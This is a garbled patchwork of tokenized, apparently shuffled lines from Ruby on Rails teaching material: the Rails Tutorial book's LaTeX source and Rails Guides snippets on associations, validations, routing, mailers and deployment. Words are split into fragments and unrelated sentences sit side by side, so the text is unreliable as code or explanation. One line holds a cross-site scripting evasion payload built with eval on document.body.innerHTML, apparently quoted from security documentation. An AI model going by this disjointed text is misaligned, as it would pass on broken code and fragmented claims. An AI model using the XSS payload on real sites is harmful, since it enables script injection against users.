▁I ▁prefer ▁the ▁\ href { http :// d ar ing fi re b all ▖ net / projects / m ar k d own /}{ Markdown ▁markup ▁language } ▁to ▁the ▁default ▁ RDoc ▁for ▁this ▁purpose , ▁and ▁if ▁you ▁use ▁the ▁file ▁extension ▁\ k ode { ▖ md } ▁then ▁GitHub ▁will ▁automatically ▁format ▁it ▁nicely ▁for ▁you .
▁( O p tion al ▁gems ▁may ▁be ▁system - dependent ▁and ▁are ▁comment ed ▁out .
▁User Mailer ▖ welcome (@ user )▖ deliver _ later
▁@ article ▖ update ▁params [: article ]
▁$ ▁bundle
▁You ▁can ▁use ▁the ▁` includes ` ▁method ▁to ▁specify ▁second - order ▁associations ▁that ▁should ▁be ▁ eager - load ed ▁when ▁this ▁association ▁is ▁used ▖ ╼╼
▁The ╼ ▁default ▁error ▁message ▁for ▁this ▁option ▁is ▁_" must ▁be ▁even " _ .
▁Using ▁the ▁\ k ode { paginate } ▁method , ▁we ▁can ▁ paginate ▁the ▁users ▁in ▁the ▁sample ▁application ▁by ▁using ▁\ k ode { paginate } ▁in ▁place ▁of ▁\ k ode { all } ▁in ▁the ▁\ k ode { index } ▁action ▁( Listing ~\ ref { code : will _ paginate _ index _ action }) .
▁README ▖ md ▁| ▁5 ▁+
▁These ▁methods ▁use ▁Time # advance ▁for ▁precise ▁date ▁ calculations ▁when ▁using ▁from _ now , ▁ ago , ▁etc ▖╼ as ▁well ▁as ▁adding ▁or ▁sub tr ac ting ▁their ▁results ▁from ▁a ▁Time ▁object ▖
▁The ▁main ▁difference ▁is ▁that , ▁rather ▁than ▁using ▁an ▁\ k ode {@ user } ▁variable ▁with ▁an ▁\ k ode { admin \_ user } ▁before ▁filter , ▁we ' ll ▁find ▁the ▁micropost ▁through ▁the ▁association , ▁which ▁will ▁automatically ▁fail ▁if ▁a ▁user ▁ tries ▁to ▁delete ▁another ▁user ' s ▁micropost .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / range / conversions ▖ rb ` .
▁### ▁` index _ by `
▁customer ▖ orders ▖ size ▁# ▁uses ▁the ▁cached ▁copy ▁of ▁orders
▁S ince ▁\ k ode { user ▖ followed \_ users } ▁should ▁be ▁an ▁array ▁of ▁users , ▁each ▁ row ▁of ▁the ▁\ k ode { followed \_ users } ▁table ▁would ▁need ▁to ▁be ▁a ▁user , ▁as ▁identifie d ▁by ▁the ▁\ k ode { followed \_ id }, ▁together ▁with ▁the ▁\ k ode { follower \_ id } ▁to ▁es tab li sh ▁the ▁association
▁* ▁` config ▖ assets ▖ compress ` ▁a ▁flag ▁that ▁enable s ▁the ▁compression ▁of ▁ compiled ▁assets ▖
▁Let ' s ▁use ▁them ▁to ▁find ▁the ▁first ▁user ▁we ▁created ▁while ▁verify ing ▁that ▁the ▁third ▁user ▁(\ k ode { foo }) ▁has ▁been ▁destroyed .
▁Client ▖ joins (: orders )▖ where (' orders ▖ created _ at ' ▁=> ▁time _ range )
▁To ▁deploy ▁the ▁application , ▁the ▁first ▁step ▁is ▁to ▁use ▁Git ▁to ▁push ▁the ▁master ▁branch ▁up ▁to ▁Heroku :
▁At ▁this ▁point , ▁the ▁ proto - feed ▁should ▁be ▁working , ▁and ▁the ▁test ▁suite ▁should ▁pass :
▁# ▁Do ▁something ▁later
▁* ▁` render ▁: plain ` ▁will ▁set ▁the ▁content ▁type ▁to ▁` text / plain `
▁ patch ▁: update _ name , ▁on : ▁: member
▁ Each ▁time ▁the ▁record ▁is ▁updated , ▁Active ▁Record ▁ increment s ▁the ▁` lock _ version ` ▁column ▖
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : digest _ method }
▁You ▁have ▁successfully ▁signed ▁up ▁to ▁example ▖ com ,╼ your ▁user name ▁is : ▁<%= ▁@ user ▖ login ▁%> .
▁You ▁can ▁use ▁the ▁` ActiveRecord :: Base ▖ table _ name = ` ▁method ▁to ▁specify ▁the ▁table ╼ name ▁that ▁should ▁be ▁used :
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / integer / inflections ▖ rb ` .
▁Here ' s ▁how ▁it ▁load s ▁the ▁middleware s :
▁In ▁Chapter ~\ ref { cha : following _ users }, ▁we ' ll ▁complete ▁our ▁t in y ▁Twitter ▁ clone ▁by ▁adding ▁the ▁not ion ▁of ▁\ emph { following } ▁users ▁in ▁order ▁to ▁receive ▁a ▁\ emph { feed } ▁of ▁their ▁microposts .
▁</ table >
▁produce s ▁the ▁HTML
▁" Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App "
▁Note ▁the ▁comment : ▁this ▁is ▁not ▁the ▁final ▁implementation , ▁but ▁it ' s ▁enough ▁to ▁get ▁us ▁started .
▁* ▁` ActiveSupport :: D eprecation ▖ silence d ` ▁set s ▁whether ▁or ▁not ▁to ▁display ▁d eprecation ▁ warning s .
▁The ▁ bang ▁versions ▁( e ▖ g ▖ ▁` save !` ) ▁raise ▁an ▁exception ▁if ▁the ▁record ▁is ▁invalid .
▁g ▖ assets ▁false
▁To ▁make ▁this ▁work , ▁you ▁need ▁to ▁declare ▁both ▁a ▁foreign ▁key ▁column ▁and ▁a ▁type ▁column ▁in ▁the ▁model ▁that ▁declare s ▁the ▁ polymorphic ▁interface :
▁Defaults ▁to ▁`: en ` .
▁% w () ▖ to _ sentence ▁# ▁=> ▁" "
▁config ▖ assets ▖ debug ▁= ▁false
▁ ╼ ▁$ ▁ spring ▁stop
▁[] ▖ to ( 7 ) ▁# ▁=> ▁[]
▁Also ▁note ▁that ▁explicitly ▁specify ing ▁`: partial ` ▁is ▁required ▁when ▁passing ▁ additional ▁options ▁such ▁as ▁`: layout ` .
▁In ▁the ▁\ k ode { div } ▁tag , ▁the ▁\ k ode { j um bo tr on } ▁CSS ▁class ▁has ▁a ▁special ▁meaning ▁to ▁Bootstrap , ▁as ▁do ▁the ▁\ k ode { btn }, ▁\ k ode { btn - l g }, ▁and ▁\ k ode { btn - primary } ▁classes ▁in ▁the ▁signup ▁button .
▁if ▁textColor ?
▁ _ Routing _ ▁d ec ide s ▁which ▁controller ▁receive s ▁which ▁requests ▖
▁The ▁block ▁receive s ▁the ▁record , ▁the ▁attribute ' s ▁name ▁and ▁the ▁attribute ' s ▁value ▖╼
▁------- ---------------- ----------------
▁#### # ▁`: source `
▁POST ▁ / articles (▖ : format ) ▁articles # create
▁### ▁` abs ence `
▁This ▁is ▁because ▁cookies ▁signed ▁base d ▁on ▁the ▁new ▁` secret _ key _ base ` ▁in ▁Rails ▁4 ▖ x ▁are ▁not ▁back ward s ▁ com p at ible ▁with ▁Rails ▁3 ▖ x ▖
▁Before :
▁ s ▁the ▁value ▁of ▁the ▁following ▁expression ? ╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - b c 0 d d 6 ' ></ span >╼╼ ▁ %= ▁ lang : ruby ╼ ▁\ begin { code } ╼ ▁ { ▁" a " ▁=> ▁100 , ▁" b " ▁=> ▁200 ▁ } ▖ merge ( { ▁" b " ▁=> ▁30 0 ▁ } )╼ ▁\ end { code }╼\ end { enumerate }╼╼ ▁% ▁subsection ▁hashes _ and _ symbols ▁( end )╼╼ ▁\ subsection { CSS ▁ revisited } ▁% ▁( fold )╼ ▁\ label { sec : css _ revisited }╼╼
▁The ▁application ▁will ▁ still ▁work ▁in ▁ Firefox ; ▁because ▁the ▁\ k ode { log \_ out } ▁method ▁in ▁Listing ~\ ref { code : log _ out _ with _ forget } ▁delete s ▁the ▁user ' s ▁id , ▁both ▁highlight ed ▁ condition al s ▁are ▁\ k ode { false } :
▁def ▁prevent _ delivery _ to _ guest s
▁For ▁example , ▁consider ▁try ing ▁to ▁save ▁a ▁user ▁with ▁an ▁invalid ▁email ▁address ▁and ▁with ▁a ▁password ▁that ' s ▁too ▁short :
▁Re m o te ▁forms ▁get ▁the ▁ authenticity ▁from ▁the ▁` meta ` ▁tag , ▁so ▁e mb ed d ing ▁is ▁unnecessary ▁unless ▁you ▁support ▁browsers ▁without ▁JavaScript ▖
▁The ▁User ▁model ▁pull s ▁all ▁the ▁users ▁from ▁the ▁database .
▁User ▖ active ▖ inactive
▁As ▁an ▁example , ▁here ' s ▁some ▁CoffeeScript ▁code ▁that ▁make s ▁an ▁Ajax ▁request ▁using ╼ the ▁ jQuery ▁library :
▁Now ▁let ' s ▁set ▁` distinct `:
▁This ▁complete s ▁the ▁signup / signin / signout ▁tri um v ir ate , ▁and ▁the ▁test ▁suite ▁should ▁pass :
▁You ▁can ▁also ▁use ▁` find _ or _ create _ by !` ▁to ▁raise ▁an ▁exception ▁if ▁the ▁new ▁record ▁is ▁invalid ▖
▁<% ▁@ articles ▖ each ▁do ▁| article | ▁%>
▁This ▁code ▁requires ▁that ▁the ▁micropost ▁be ▁valid ▁and ▁tests ▁for ▁the ▁presence ▁of ▁the ▁\ k ode { user \_ id } ▁attribute .
▁ Error ▁messages ▁that ▁work ▁with ▁other ▁objects ▖
▁A ▁mockup ▁of ▁successful ▁signup .
▁This ▁display s ▁some ▁useful ▁information ▁about ▁each ▁page ▁using ▁the ▁built - in ▁\ k ode { debug } ▁method ▁and ▁\ k ode { params } ▁variable ▁( which ▁we ' ll ▁learn ▁more ▁about ▁in ▁Section ~\ ref { sec : a _ users _ resource }) .
▁P erhaps ▁so .
▁By ▁the ▁way , ▁the ▁extra ▁level ▁of ▁indentation ▁on ▁the ▁\ k ode { user \_ params } ▁method ▁is ▁design ed ▁to ▁make ▁it ▁ visual ly ▁apparent ▁which ▁methods ▁are ▁defined ▁after ▁\ k ode { private } .
▁config ▖ active _ support ▖ test _ order ▁= ▁: s or ted ▁# ▁or ▁`: r an dom ` ▁if ▁you ▁prefer
▁< h 1> David ▁H einemeier ▁Hansson </ h 1>
▁TIP : ▁Rails ▁automatically ▁wrap s ▁fields ▁that ▁contain ▁an ▁error ▁with ▁a ▁ div ╼ with ▁class ▁` field _ with _ errors ` ▖
▁When ▁we ▁allow ▁users ▁to ▁log ▁in ▁to ▁the ▁sample ▁app ▁starting ▁in ▁Chapter ~\ ref { cha : sign _ up }, ▁we ▁will ▁need ▁to ▁find ▁the ▁user ▁record ▁corresponding ▁to ▁the ▁submitted ▁email ▁address .
▁* ▁` active _ record ▖ log _ run time ` ▁In clu de s ▁` ActiveRecord :: Railtie s :: Controller Runtime ` ▁which ▁is ▁responsib le ▁for ▁report ing ▁the ▁time ▁taken ▁by ▁Active ▁Record ▁calls ▁for ▁the ▁request ▁back ▁to ▁the ▁ logger .
▁### ▁P o ly m or ph ic ▁Associations
▁If ▁you ▁are ▁completely ▁new ▁to ▁web ▁programming ▁and ▁find ▁the ▁\ emph { Rails ▁Tutorial } ▁too ▁difficult , ▁I ▁suggest ▁learning ▁the ▁basic s ▁of ▁HTML ▁and ▁CSS ▁and ▁then ▁giv ing ▁the ▁\ emph { Rails ▁Tutorial } ▁another ▁go .
▁If ▁you ▁ still ▁find ▁this ▁tutorial ▁too ▁difficult , ▁you ▁m ight ▁try ▁starting ▁with ▁\ href { http :// learn - rails ▖ com / learn - ruby - on - rails ▖ html }{\ emph { Learn ▁Ruby ▁on ▁Rails } } ▁by ▁D an i el ▁Ke h o e ▁or ▁\ href { http :// mb sy ▖ co / 7 Z d c 7 } { O ne ▁Mon th ▁Rails }, ▁both ▁of ▁which ▁are ▁ ge ar ed ▁more ▁toward ▁complete ▁beginners ▁than ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } .
▁On ▁M ac ▁OS ▁X ▁open ▁T er m in al ▖ app , ▁on ▁Windows ▁choose ╼ " R un " ▁from ▁your ▁Start ▁ menu ▁and ▁type ▁' cm d ▖ ex e ' ▖
▁create ▁app / assets / stylesheets / welcome ▖ css ▖ scss
▁# ▁gem ▁' therubyracer ', ▁platform s : ▁: ruby
▁WHERE ▁ follower _ id ▁= ▁: user _ id "
▁If ▁a ▁helper ▁is ▁specific ▁to ▁a ▁particular ▁controller , ▁you ▁should ▁put ▁it ▁in ▁the ▁corresponding ▁helper ▁file ; ▁for ▁example , ▁helpers ▁for ▁the ▁Static ▁Pages ▁controller ▁generally ▁go ▁in ▁\ k ode { app / helpers / static \_ pages \_ helper ▖ rb } .
▁GitHub ▁also ▁has ▁native ▁applications ▁to ▁ augment ▁the ▁command - line ▁interface , ▁so ▁if ▁you ' re ▁more ▁ com for table ▁with ▁ GUI ▁app s ▁you ▁m ight ▁want ▁to ▁check ▁out ▁\ href { http :// w in do w s ▖ github ▖ com /}{ GitHub ▁for ▁Windows } ▁or ▁\ href { http :// ma c ▖ github ▖ com /}{ GitHub ▁for ▁M ac } .
▁The ▁URL ▁ / users /1 ▁with ▁routing ▁but ▁no ▁page ▖ ~\ href { http :// railstutorial ▖ org / images / figures / user _ show _ unknown _ action _ 4 - full ▖ png }{( full ▁size )}
▁As ▁implie d ▁by ▁their ▁name , ▁controller ▁actions ▁are ▁defined ▁inside ▁controllers .
▁ Pro no un c ed ▁`` ess - c ue - e ll '' , ▁though ▁the ▁alter n ate ▁pro n un ci ation ▁`` s equ el '' ▁is ▁also ▁common .
▁Next ▁we ▁update ▁the ▁development ▁and ▁test ▁database s ▁as ▁usual :
▁#### ▁date _ field _ tag
▁Rails ▁En v ir on ment ▁ Settings
▁ Range s ▁are ▁useful ▁for ▁pull ing ▁out ▁array ▁elements :
▁These ▁objects ▁will ▁be ▁ instantiated ▁from ▁the ▁passed ▁attributes , ▁and ▁the ▁link ▁through ▁their ▁foreign ▁key ▁will ▁be ▁created , ▁but ▁the ▁ associated ▁objects ▁will ▁ _ not _ ▁yet ▁be ▁saved .
▁<%= ▁f ▖ text _ field ▁: title ▁%>< br >
▁ --- ---
▁L oo p ing ▁over ▁the ▁users ▁first ▁gives ▁feed s ▁with ▁big ▁run s ▁of ▁microposts ▁from ▁the ▁same ▁user , ▁which ▁is ▁ visual ly ▁un app e al ing ▖)
▁xml ▁version =" 1 ▖ 0 " ▁encoding =" UT F -8 " ?
▁To ▁verify ▁whether ▁or ▁not ▁a ▁particular ▁attribute ▁of ▁an ▁object ▁is ▁valid , ▁you ▁can ╼ use ▁` errors [: attribute ]` ▖
▁There ' s ▁only ▁one ▁problem ▁with ▁our ▁application ▁as ▁it ▁stand s : ▁short ▁of ▁clear ing ▁their ▁browser ▁cookies ▁( or ▁wait ing ▁20 ▁ years ), ▁there ' s ▁no ▁way ▁for ▁users ▁to ▁log ▁out .
▁* ▁The ▁HTTP ▁verb ▁used ▁( if ▁the ▁route ▁doesn ' t ▁respond ▁to ▁all ▁verb s )
▁ ╼ ▁# ▁Link s ▁for ▁non - signed - in - users
▁ pe t abytes
▁( You ▁may ▁also ▁have ▁to ▁create ▁that ▁directory ▁as ▁well , ▁either ▁with ▁\ k ode { mkdir } ▁or ▁with ▁a ▁gra ph ical ▁file ▁ manager ▖)
▁* ▁` build _ association ( attributes ▁= ▁{}) `
▁In ▁the ▁latest ▁version ▁of ▁Rails , ▁there ▁are ▁\ emph { th re e } ▁can on ical ▁directories ▁for ▁static ▁assets , ▁each ▁with ▁its ▁own ▁purpose :
▁Guard ▁with ▁Spork
▁Inde ed , ▁you ▁will ▁ ra re ly ▁see ▁the ▁ de s k to p ▁of ▁an ▁experience d ▁developer ▁without ▁sever al ▁open ▁terminal ▁window s ▁running ▁command - line ▁ s hell s .
▁t ▖ integer ▁: image able _ id
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s ▖ created _ at ▁ BETWEEN ▁' 2008 - 12 - 2 1 ▁00:00:00 ' ▁ AND ▁' 2008 - 12 - 22 ▁00:00:00 ')
▁D S _ Store
▁exercise ' ▁id =' ex - c b 38 fe ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁signup _ url ▁( end )╼╼ ▁% ▁section ▁user _ signup ▁( end )╼╼ ▁\ section { Co nclusion } ▁% ▁( fold )╼ ▁\ label { sec : layout _ co nclusion }╼╼
▁make _ relationships
▁ HA V IN G ▁ sum ( price ) ▁> ▁100
▁* ▁` config ▖ assets ▖ paths ` ▁contains ▁the ▁paths ▁which ▁are ▁used ▁to ▁look ▁for ▁assets ▖
▁( Technical ly , ▁\ k ode { params [: id ]} ▁is ▁the ▁string ~\ k ode { "1" }, ▁but ▁\ k ode { find } ▁is ▁ s m ar t ▁enough ▁to ▁convert ▁this ▁to ▁an ▁ integer ▖)
▁$ ▁rails ▁generate ▁scaffold ▁Micropost ▁content : string ▁user _ id : integer
▁Now ▁if ▁we ▁execute ▁`@ user ▖ to do s ▖ create ` ▁then ▁`@ to do ` ▁record ▁will ▁have ╼` user _ id ` ▁value ▁as ▁the ▁` guid ` ▁value ▁of ▁`@ user ` .
▁ alert ( eval (' document ▖ body ▖ in ne ' ▁+ ▁' r HTML ') ) ;
▁> > ▁1▖ kilobyte
▁Set ▁it ▁to ▁' D E N Y ' ▁to ▁d en y ▁f ra m ing ▁at ▁all ▁or ▁' ALL O W ALL ' ▁if ▁you ▁want ▁to ▁allow ▁f ra m ing ▁for ▁all ▁website .
▁You ▁may ▁find ▁that ▁your ▁application ▁requires ▁a ▁layout ▁that ▁differ s ▁slightly ▁from ▁your ▁regular ▁application ▁layout ▁to ▁support ▁one ▁particular ▁controller ▖
▁ 1235551234 ▖ to _ s (: phone , ▁ delimiter : ▁" ▁" )
▁ Go ▁get ▁them :
▁def ▁re format _ name ( name )
▁the ▁first ▁line ▁is ▁a ▁comment ▁indicat ing ▁the ▁purpose ▁of ▁the ▁subsequent ▁function ▁definition .
▁The ▁\ k ode { Microposts Controller } ▁class , ▁with ▁inheritance .
▁The ▁first ▁image ▁validation , ▁which ▁restrict s ▁upload s ▁to ▁valid ▁image ▁types , ▁appears ▁in ▁the ▁ CarrierWave ▁ uploader ▁itself .
▁This ▁gem ▁contains ▁an ▁engine ▁class ▁which ╼ in her it s ▁from ▁` Rails :: Engine ` ▖
▁validates ▁: order , ▁absence : ▁true
▁ Updating ▁the ▁rendering ▁of ▁user ▁signup ▁errors .
▁You ▁should ▁verify ▁that ▁the ▁tests ▁pass :
▁╼╼ If ▁you ▁did ▁not ▁request ▁your ▁password ▁to ▁be ▁reset , ▁please ▁ignore ▁this ▁email ▁and ╼ your ▁password ▁will ▁ st a y ▁as ▁it ▁is .
▁Windows ▁users ▁should ▁understand ▁that ▁their ▁systems ▁will ▁use ▁the ▁analogous ▁an g le ▁pro mp t ~\ k ode { > } :
▁ isolate _ namespace ▁Blorgh
▁This ▁is ▁a ▁ reflection ▁of ▁the ▁REST ▁architecture ▁common ▁to ▁both ▁resources .
▁The ▁RESTful ▁structure ▁of ▁Rails ▁applications ▁is ▁best ▁ abs o rb ed ▁by ▁this ▁sort ▁of ▁repetition ▁of ▁form --- in de ed , ▁see ing ▁the ▁parallel ▁structure ▁of ▁Users ▁and ▁Microposts ▁even ▁at ▁this ▁ early ▁stage ▁is ▁one ▁of ▁the ▁p ri me ▁ motivation s ▁for ▁this ▁chapter .
▁For ▁convenience , ▁we ' ll ▁use ▁the ▁\ k ode { create } ▁method ▁discuss ed ▁in ▁Section ~\ ref { sec : creating _ user _ objects }, ▁but ▁in ▁the ▁present ▁case ▁we ' ll ▁take ▁care ▁\ emph { not } ▁to ▁start ▁in ▁a ▁ sandbox ▁so ▁that ▁the ▁result ing ▁user ▁will ▁be ▁saved ▁to ▁the ▁database .
▁#### ▁collection _ select
▁The ▁user ▁edit ▁page ▁(\ href { http :// localhost :3000/ users /1/ edit }{/ users /1/ edit }) .
▁ ╼ ▁ / Users / mhartl / rails _ projects / sample _ app / spec / models / user _ spec ▖ rb
▁F a st ▁forward
▁Be ▁ w ar n ed ▁that ▁if ▁your ▁background ▁is ▁in ▁C / C + + ▁or ▁ Java , ▁you ▁may ▁find ▁Ruby ▁a ▁bit ▁of ▁an ▁ o d d ▁d u c k , ▁and ▁it ▁m ight ▁take ▁time ▁to ▁get ▁used ▁to ▁it ; ▁just ▁ s tic k ▁with ▁it ▁and ▁eventual ly ▁you ' ll ▁be ▁fine .
▁[] ▖ sum (1) ▁ { | n | ▁ n ** 3 } ▁# ▁=> ▁1
▁No ▁user ▁passwords
▁╼╼ ▁% ▁subsection ▁ modeling _ microposts ▁( end ) ╼╼% ▁section ▁ planning _ the _ application ▁( end )╼╼ ▁\ section { The ▁Users ▁resource } ▁% ▁( fold )╼ ▁\ label { sec : demo _ users _ resource }╼╼
▁ Error ▁message ▁from ▁ submitting ▁the ▁update ▁form ▖ ~\ href { http :// railstutorial ▖ org / images / figures / edit _ with _ invalid _ information _ bootstrap - full ▖ png }{( full ▁size )}
▁Here ▁is ▁an ▁example ▁C HA N G E LO G ▁entry :
▁E s c a pe ▁ carrier ▁returns ▁and ▁single ▁and ▁double ▁ quot es ▁for ▁JavaScript ▁segment s .
▁With ▁all ▁the ▁prepar ation ▁from ▁Section ~\ ref { sec : sample _ app _ setup } ▁ finished , ▁we ' re ▁ready ▁to ▁get ▁started ▁developing ▁the ▁sample ▁application .
▁file : ▁ attachment ,
▁# ▁< name > David ▁H einemeier ▁Hansson </ name >
▁A ▁template ▁for ▁an ▁improve d ▁`` remember ▁me '' ▁test ▖
▁xml ▖ rs s (" version " ▁=> ▁" 2▖ 0 ", ▁" xml n s : d c " ▁=> ▁" http :// p url ▖ org / d c / e le ment s /1▖1 / ") ▁do
▁Creat ing ▁ Response s
▁The ▁Microposts ▁controller ▁\ k ode { create } ▁action .
▁A ▁ preview ▁of ▁the ▁HTML ▁version ▁of ▁the ▁password ▁reset ▁email .
▁The ▁defin ing ▁ q u al ity ▁of ▁ TDD ▁is ▁writing ▁tests ▁\ emph { first }, ▁before ▁the ▁application ▁code .
▁" high ri se _ production ▖ com p an ies "▖ classify ▁# ▁=> ▁" Co mp any "
▁as ▁seen ▁in ▁Listing ~\ ref { code : empty _ relationship _ fixture } .
▁# ▁initialization ▁code ▁go es ▁here
▁The ▁ Rubular ▁website ▁has ▁a ▁be a u t i ful ▁inter active ▁interface ▁for ▁making ▁regular ▁expression s , ▁along ▁with ▁a ▁hand y ▁ regex ▁quick ▁reference .
▁#### ▁For ▁a ▁ Part ic ul ar ▁Co mp on ent
▁On ▁failure , ▁use ▁` ajax : error ` ▖
▁Return s ▁a ▁set ▁of ▁select ▁tags ▁( one ▁for ▁ year , ▁ month , ▁and ▁day ) ▁pre - select ed ▁for ▁access ing ▁a ▁specified ▁date - base d ▁attribute .
▁Now ▁that ▁we ' ve ▁updated ▁the ▁\ k ode { README }, ▁we ▁can ▁push ▁the ▁changes ▁up ▁to ▁Bitbucket ▁to ▁see ▁the ▁result .
▁This ▁guide ▁cover s ▁the ▁basic ▁layout ▁features ▁of ▁Action ▁Controller ▁and ▁Action ▁View .
▁Rails ▁has ▁classes ▁that ▁a c t ▁like ▁` Date ` ▁or ▁` Time ` ▁and ▁follow ▁this ▁con tr ac t .
▁This ▁standard ▁directory ▁and ▁file ▁structure ▁( Figure ~\ ref { fig : directory _ structure _ rails }) ▁is ▁one ▁of ▁the ▁many ▁advantage s ▁of ▁Rails ; ▁it ▁immediately ▁get s ▁you ▁from ▁ zero ▁to ▁a ▁functional ▁( if ▁minimal ) ▁application .
▁Return s ▁the ▁sub string ▁of ▁the ▁string ▁up ▁to ▁position ▁` position `:
▁Rails ▁is ▁ o p in ion at ed ▁software ▖
▁ ╼ ▁# ▁Link s ▁for ▁signed - in ▁users
▁#### ▁email _ field
▁$ ▁gem ▁install ▁rails
▁ Updating ▁\ k ode { authenticated ?}\
▁By ▁the ▁way , ▁for ▁a ▁change ▁as ▁small ▁as ▁this ▁one ▁I ▁would n ' t ▁normal ly ▁both er ▁with ▁a ▁new ▁branch , ▁but ▁it ' s ▁ never ▁too ▁ early ▁to ▁start ▁p ra c tic ing ▁good ▁ha bit s .
▁p
▁If ▁we ▁first ▁move ▁the ▁date ▁bit s ▁( that ▁have ▁also ▁a ▁relative ▁order ▁of ▁process ing , ▁as ▁document ed ▁before ), ▁and ▁then ▁the ▁time ▁bit s ▁we ▁get ▁for ▁example ▁the ▁following ▁ com put ation :
▁You ▁can ▁evaluate ▁code ▁in ▁the ▁context ▁of ▁any ▁object ' s ▁ singleton ▁class ▁using ▁` class _ eval `:
▁ ╼ ▁$ ▁ heroku ▁run ▁console
▁` to _ time ` ▁receive s ▁an ▁optional ▁argument ▁`: utc ` ▁or ▁`: local `, ▁to ▁indicate ▁which ▁time ▁ zone ▁you ▁want ▁the ▁time ▁in :
▁Of ▁course , ▁this ▁is ▁because ▁there ▁are ▁not ▁current ly ▁any ▁microposts .
▁The ▁` test ` ▁directory ▁should ▁be ▁treat ed ▁like ▁a ▁typical ▁Rails ▁testing ▁environment ,╼ allow ing ▁for ▁ unit , ▁functional ▁and ▁integration ▁tests .
▁P lease ▁refer ▁to ▁their ▁documentation ▁above ▁and ▁take ▁into ▁account ▁the ▁following ▁difference s :
▁#### # ▁` beginning _ of _ hour `, ▁` end _ of _ hour `
▁De c id ing ▁when ▁and ▁how ▁to ▁test ▁depend s ▁in ▁part ▁on ▁how ▁ com for table ▁you ▁are ▁writing ▁tests ; ▁many ▁developers ▁find ▁that , ▁as ▁they ▁get ▁better ▁at ▁writing ▁tests , ▁they ▁are ▁more ▁in c line d ▁to ▁write ▁them ▁first .
▁\ href { http :// rails lab ▖ new rel ic ▖ com / s caling - rails } { S caling ▁Rails } : ▁One ▁topic ▁we ' ve ▁hard ly ▁covered ▁in ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁book ▁is ▁perform ance , ▁opt im i z ation , ▁and ▁ s caling .
▁create ▁test / models / blorgh / article _ test ▖ rb
▁Rails ▁uses ╼ rake ▁commands ▁to ▁run ▁migrations , ▁and ▁it ' s ▁possible ▁to ▁undo ▁a ▁migration ▁after ╼ it ' s ▁been ▁applied ▁to ▁your ▁database ▖
▁The ▁method ▁` utc ` ▁gives ▁you ▁the ▁same ▁ datetime ▁in ▁the ▁receiver ▁express ed ▁in ▁UTC .
▁You ▁will ▁also ▁have ▁to ▁update ▁the ▁tests , ▁as ▁the ▁forms ▁are n ' t ▁current ly ▁\ emph { exactly } ▁the ▁same ; ▁identify ▁the ▁ s l ight ▁difference ▁and ▁update ▁the ▁tests ▁according ly .
▁# ▁POST ▁ / users ▖ json
▁# ▁=> ▁Mon , ▁09 ▁A ug ▁2010
▁in ▁Listing ~\ ref { code : micropost _ form } .
▁=> ▁[" foo ", ▁" bar ", ▁" baz ", ▁" q u u x "]
▁In ▁this ▁section , ▁we ' ll ▁out line ▁our ▁plan s ▁for ▁the ▁toy ▁application .
▁has ▁the ▁value ▁we ▁need .
▁As ▁noted ▁brief ly ▁in ▁Section ~\ ref { sec : the _ hello _ application }, ▁Bundler ▁is ▁run ▁automatically ▁( via ▁\ k ode { bundle ▁install }) ▁by ▁the ▁\ k ode { rails } ▁command , ▁but ▁in ▁this ▁section ▁we ' ll ▁make ▁some ▁changes ▁to ▁the ▁default ▁application ▁gems ▁and ▁run ▁Bundler ▁again .
▁### ▁Resource s ▁on ▁the ▁Web
▁=> ▁ Ctrl - C ▁to ▁ sh u td own ▁server
▁Defaults ▁to ▁ UT F -8 .
▁For ▁example , ▁when ▁an ▁action ▁of ▁` Article sController ` ▁is ▁called ▁Rails ▁ tries ▁ optimistic ally ▁to ▁use ▁` Article s Helper ` ▖
▁The ▁helper ▁method ▁` full _ messages ` ▁uses ▁` humanize ` ▁as ▁a ▁f all back ▁to ▁include ╼ attribute ▁names :
▁Thu s , ▁explicit ▁configuration ▁would ▁be ▁needed ╼ only ▁in ▁those ▁cases ▁where ▁you ▁can ' t ▁follow ▁the ▁standard ▁convention .
▁In ▁the ▁present ▁case , ▁each ▁micropost ▁is ▁ associated ▁with ▁one ▁user , ▁and ▁each ▁user ▁is ▁ associated ▁with ▁( potentially ) ▁many ▁microposts --- a ▁relationship ▁seen ▁brief ly ▁in ▁Section ~\ ref { sec : demo _ user _ has _ many _ microposts } ▁and ▁show n ▁schematic ally ▁in ▁Figure ~\ ref { fig : micropost _ belongs _ to _ user } ▁and ▁Figure ~\ ref { fig : user _ has _ many _ microposts } .
▁* ▁How ▁to ▁help ▁re s ol ve ▁existing ▁issues .
▁A ▁mockup ▁of ▁the ▁user ▁profile ▁made ▁in ▁this ▁section .
▁On ▁complet ion , ▁the ▁temporary ▁file ▁is ▁re name d , ▁which ▁is ▁an ▁ atomic ▁operation ▁on ▁P OS I X ▁systems ▖
▁ SELECT ▁* ▁FROM ▁articles ▁WHERE ▁` trashed ` ▁= ▁1 ▁ AND ▁` trashed ` ▁= ▁0
▁in ▁Listing ~\ ref { code : user _ relationships _ association } ▁and
▁( As ▁prepar ation ▁for ▁future ▁development , ▁the ▁last ▁step ▁here ▁check s ▁out ▁the ▁master ▁branch , ▁but ▁we ▁\ emph { d on ' t } ▁merge ▁in ▁the ▁changes ▁in ▁order ▁to ▁avoid ▁conflicts ▁with ▁the ▁rest ▁of ▁the ▁tutorial ▖)
▁check s ▁to ▁see ▁that ▁the ▁content ▁inside ▁the ▁\ k ode { title } ▁tag ▁is
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ text / hash / transform _ value s ▖ rb ` .
▁Return ed ▁strings ▁are :
▁* ▁` add _ locales ` ▁Add s ▁the ▁files ▁in ▁` config / locales ` ▁( from ▁the ▁application , ▁ railties ▁and ▁engines ) ▁to ▁` I 18 n ▖ load _ path `, ▁making ▁available ▁the ▁ tr an s l ation s ▁in ▁these ▁files .
▁user name : ▁root
▁One ▁of ▁the ▁results ▁of ▁the ▁\ k ode { generate } ▁command ▁in ▁Listing ~\ ref { code : generate _ user _ model } ▁is ▁a ▁new ▁file ▁called ▁a ▁\ emph { migration } .
▁=> ▁" mhartl @ example ▖ net "
▁ 12345 ▖ to _ s (: human _ size ) ▁# ▁=> ▁1 2▖1 ▁ K B
